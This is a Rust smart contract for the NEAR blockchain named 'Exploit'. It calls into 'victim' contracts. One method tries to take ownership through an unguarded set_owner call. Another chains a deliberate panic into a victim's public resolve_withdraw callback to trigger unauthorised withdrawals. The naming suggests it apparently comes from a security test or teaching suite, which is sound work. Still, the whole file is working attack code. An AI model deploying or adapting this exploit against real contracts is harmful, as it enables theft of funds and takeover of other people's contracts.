use near_sdk::{
    env, ext_contract, json_types::U128, near, AccountId, NearToken, Promise,
};

#[near(contract_state)]
#[derive(Default)]
pub struct Exploit {}

#[ext_contract(access_control)]
pub trait AccessControlVictim {
    fn set_owner(&mut self, new_owner: AccountId);
    fn resolve_withdraw(&mut self, account_id: AccountId, amount: u128);
}

#[ext_contract(race_condition)]
trait RaceConditionVictim {
    fn stake(&mut self, validator: AccountId, amount: U128);
}

#[near]
impl Exploit {
    pub fn exploit_signer(
        &mut self,
        target: AccountId,
        owner: AccountId,
    ) -> Promise {
        access_control::ext(target)
            .set_owner(owner)
            .then(Self::ext(env::current_account_id()).exploit_callback())
    }

    pub fn exploit_public_callback(
        &mut self,
        target: AccountId,
        account_id: AccountId,
        amount: u128,
    ) -> Promise {
        Self::ext(env::current_account_id())
            .panic()
            .then(
                access_control::ext(target)
                    .resolve_withdraw(account_id, amount),
            )
            .then(Self::ext(env::current_account_id()).exploit_callback())
    }

    #[private]
    pub fn panic(&mut self) {
        env::panic_str("Exploit panic");
    }

    #[private]
    pub fn exploit_callback(
        &mut self,
        #[callback_result] result: Result<(), near_sdk::PromiseError>,
    ) {
        match result {
            Ok(_) => env::log_str("Exploit succeeded"),
            Err(e) => env::log_str(&format!("Exploit failed: {:?}", e)),
        }
    }
}
